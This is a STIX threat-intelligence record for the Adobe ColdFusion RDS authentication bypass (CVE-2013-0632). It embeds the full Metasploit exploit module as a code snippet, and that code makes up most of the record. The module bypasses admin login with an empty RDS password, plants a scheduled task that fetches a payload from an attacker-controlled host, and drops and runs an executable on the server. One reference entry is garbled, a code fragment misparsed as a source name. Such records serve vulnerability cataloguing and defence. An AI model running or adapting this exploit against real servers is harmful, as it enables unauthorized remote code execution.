{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3158c5e4-0ac8-4e83-b6b7-0383bd5c2135",
    "created": "2024-08-14T17:10:38.010615Z",
    "modified": "2024-08-14T17:10:38.010618Z",
    "name": "Adobe ColdFusion RDS Authentication Bypass",
    "description": " Adobe ColdFusion 9.0, 9.0.1, 9.0.2, and 10 allows remote attackers to bypass authentication using the RDS component. Due to default settings or misconfiguration, its password can be set to an empty value. This allows an attacker to create a session via the RDS login that can be carried over to the admin web interface even though the passwords might be different, and therefore bypassing authentication on the admin web interface leading to arbitrary code execution. Tested on Windows and Linux with ColdFusion 9. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/coldfusion_rds_auth_bypass.rb",
            "external_id": "coldfusion_rds_auth_bypass.rb"
        },
        {
            "source_name": "\"CVE\"",
            "external_id": "\"2013-0632\""
        },
        {
            "source_name": "\"URL\"",
            "external_id": "\"http://www.adobe.com/support/security/bulletins/apsb13-03.html\""
        },
        {
            "source_name": "fail_with(Failure::Unknown",
            "external_id": "\"#{peer}-MappingsURLwasunreachable\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n  include Msf::Module::Deprecated\n\n  moved_from 'exploit/multi/http/coldfusion_rds'\n\n  Rank = GreatRanking\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Adobe ColdFusion RDS Authentication Bypass',\n      'Description'     => %q{\n        Adobe ColdFusion 9.0, 9.0.1, 9.0.2, and 10 allows remote\n        attackers to bypass authentication using the RDS component. Due to\n        default settings or misconfiguration, its password can be set to an\n        empty value. This allows an attacker to create a session via the RDS\n        login that can be carried over to the admin web interface even though\n        the passwords might be different, and therefore bypassing authentication\n        on the admin web interface leading to arbitrary code execution. Tested\n        on Windows and Linux with ColdFusion 9.\n      },\n      'Author'          =>\n        [\n          'Scott Buckel', # Vulnerability discovery\n          'Mekanismen <mattias[at]gotroot.eu>' # Metasploit module\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          [ \"CVE\", \"2013-0632\" ],\n          [ \"EDB\", \"27755\" ],\n          [ \"URL\", \"http://www.adobe.com/support/security/bulletins/apsb13-03.html\" ]\n        ],\n      'Privileged'      => false,\n      'Stance'          => Msf::Exploit::Stance::Aggressive, #thanks juan!\n      'Platform'        => ['win', 'linux'],\n      'Targets'         =>\n        [\n         [ 'Windows',\n            {\n            'Arch' => ARCH_X86,\n            'Platform' => 'win'\n            }\n          ],\n          [ 'Linux',\n            {\n            'Arch' => ARCH_X86,\n            'Platform' => 'linux'\n            }\n          ],\n        ],\n      'DefaultTarget'   => 0,\n      'DisclosureDate'  => '2013-08-08'\n    ))\n\n    register_options(\n      [\n        OptString.new('EXTURL', [ false, 'An alternative host to request the CFML payload from', \"\" ]),\n        OptInt.new('HTTPDELAY', [false, 'Time that the HTTP Server will wait for the payload request', 10]),\n      ])\n\n    register_advanced_options(\n      [\n        OptString.new('CFIDDIR', [ true, 'Alternative CFIDE directory', 'CFIDE'])\n      ])\n  end\n\n  def check\n    uri = target_uri.path\n\n    #can we access the admin interface?\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'administrator', 'index.cfm'),\n    })\n\n    if res && res.code == 200 && res.body.include?('ColdFusion Administrator Login')\n       vprint_good \"Administrator access available\"\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n    #is it cf9?\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'administrator', 'images', 'loginbackground.jpg')\n    })\n\n    img = Rex::Text.md5(res.body.to_s)\n    imghash = \"596b3fc4f1a0b818979db1cf94a82220\"\n\n    if img == imghash\n      vprint_good \"ColdFusion 9 Detected\"\n    else\n      return Exploit::CheckCode::Safe\n    end\n\n    #can we access the RDS component?\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'adminapi', 'administrator.cfc'),\n      'vars_post' => {\n          'method' => \"login\",\n          'adminpassword' => \"\",\n          'rdsPasswordAllowed' => \"1\"\n       }\n    })\n\n    if res && res.code == 200 && res.body.include?('true')\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    @pl           = gen_file_dropper\n    @payload_url  = \"\"\n\n    if datastore['EXTURL'].blank?\n      begin\n        Timeout.timeout(datastore['HTTPDELAY']) {super}\n      rescue Timeout::Error\n      end\n      exec_payload\n    else\n      @payload_url = datastore['EXTURL']\n      upload_payload\n      exec_payload\n    end\n  end\n\n  def primer\n    @payload_url = get_uri\n    upload_payload\n  end\n\n  def on_request_uri(cli, request)\n    if request.uri =~ /#{get_resource}/\n      send_response(cli, @pl)\n    end\n  end\n\n  def autofilter\n    true\n  end\n\n  #task scheduler is pretty bad at handling binary files and likes to mess up our meterpreter :-(\n  #instead we use a CFML filedropper to embed our payload and execute it.\n  #this also removes the dependancy of using the probe.cfm to execute the file.\n\n  def gen_file_dropper\n    rand_var    = rand_text_alpha(8+rand(8))\n    rand_file   = rand_text_alpha(8+rand(8))\n\n    if datastore['TARGET'] == 0\n      rand_file += \".exe\"\n    end\n\n    encoded_pl  = Rex::Text.encode_base64(generate_payload_exe)\n\n    print_status \"Building CFML shell...\"\n    #embed payload\n    shell = \"\"\n    shell += \" <cfset #{rand_var} = ToBinary( \\\"#{encoded_pl}\\\" ) />\"\n    shell += \" <cffile action=\\\"write\\\" output=\\\"##{rand_var}#\\\"\"\n    shell += \" file= \\\"#GetDirectoryFromPath(GetCurrentTemplatePath())##{rand_file}\\\"\"\n    #if linux set correct permissions\n    if datastore['TARGET'] == 1\n      shell += \" mode = \\\"700\\\"\"\n    end\n    shell += \"/>\"\n    #clean up our evil .cfm\n    shell += \" <cffile action=\\\"delete\\\"\"\n    shell += \" file= \\\"#GetDirectoryFromPath(GetCurrentTemplatePath())##listlast(cgi.script_name,\\\"/\\\")#\\\"/>\"\n    #execute our payload!\n    shell += \" <cfexecute\"\n    shell += \" name = \\\"#GetDirectoryFromPath(GetCurrentTemplatePath())##{rand_file}\\\"\"\n    shell += \" arguments = \\\"\\\"\"\n    shell += \" timeout = \\\"60\\\"/>\"\n\n    return shell\n  end\n\n  def exec_payload\n    uri = target_uri.path\n\n    print_status(\"Our payload is at: #{peer}\\\\#{datastore['CFIDDIR']}\\\\#{@filename}\")\n    print_status(\"Executing payload...\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, datastore['CFIDDIR'], @filename)\n    })\n  end\n\n  def upload_payload\n    uri = target_uri.path\n\n    @filename = rand_text_alpha(8+rand(8)) + \".cfm\" #numbers is a bad idea\n    taskname = rand_text_alpha(8+rand(8)) #numbers is a bad idea\n\n    print_status \"Trying to upload payload via scheduled task...\"\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'adminapi', 'administrator.cfc'),\n      'vars_post' => {\n          'method' => \"login\",\n          'adminpassword' => \"\",\n          'rdsPasswordAllowed' => \"1\"\n       }\n    })\n\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - RDS component was unreachable\")\n    end\n\n    #deal with annoying cookie data prepending (sunglasses)\n    cookie = res.get_cookies\n\n    if res && res.code == 200 && cookie =~ /CFAUTHORIZATION_cfadmin=;(.*)/\n      cookie = $1\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unable to get auth cookie\")\n    end\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'administrator', 'index.cfm'),\n      'cookie' => cookie\n    })\n\n    if res && res.code == 200 && res.body.include?('ColdFusion Administrator')\n      print_good(\"Logged in as Administrator!\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Login Failed\")\n    end\n\n    #get file path gogo\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'administrator', 'settings', 'mappings.cfm'),\n      'vars_get' => {\n        'name' => \"/CFIDE\"\n      },\n      'cookie' => cookie\n    })\n\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Mappings URL was unreachable\")\n    end\n\n    if res.body =~ /<input type=\"text\" maxlength=\"550\" name=\"directoryPath\" value=\"(.*)\" size=\"40\" id=\"dirpath\">/\n      file_path = $1\n      print_good(\"File path disclosed! #{file_path}\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unable to get upload filepath\")\n    end\n\n    print_status(\"Adding scheduled task\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'administrator', 'scheduler', 'scheduleedit.cfm'),\n      'vars_post' => {\n        'TaskName' => taskname,\n        'Start_Date' => \"Nov 1, 2420\",\n        'End_Date' => \"\",\n        'Interval' => \"\",\n        'ScheduleType' => \"Once\",\n        'Operation' => \"HTTPRequest\",\n        'ScheduledURL' => @payload_url,\n        'publish' => \"1\",\n        'publish_file' => \"#{file_path}\\\\#{@filename}\",\n        'adminsubmit' => \"Submit\"\n      },\n      'cookie' => cookie\n    })\n\n    unless res && res.code == 200 || res.code == 302 #302s can happen but it still works, http black magic!\n      fail_with(Failure::Unknown, \"#{peer} - Scheduled task failed\")\n    end\n\n    print_status(\"Running scheduled task\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'administrator', 'scheduler', 'scheduletasks.cfm'),\n      'vars_get' => {\n        'runtask' => taskname,\n        'timeout' => \"0\"\n      },\n      'cookie' => cookie\n      })\n\n    if res && res.code == 200 && res.body.include?('This scheduled task was completed successfully')\n      print_good(\"Scheduled task completed successfully\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Scheduled task failed\")\n    end\n\n    print_status(\"Deleting scheduled task\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, datastore['CFIDDIR'], 'administrator', 'scheduler', 'scheduletasks.cfm'),\n      'vars_get' => {\n        'action' => \"delete\",\n        'task' => taskname\n      },\n      'cookie' => cookie\n    })\n\n    unless res && res.code == 200\n      print_error(\"Scheduled task deletion failed, cleanup might be needed!\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-08-08",
    "x_mitre_platforms": [
        "linux"
    ]
}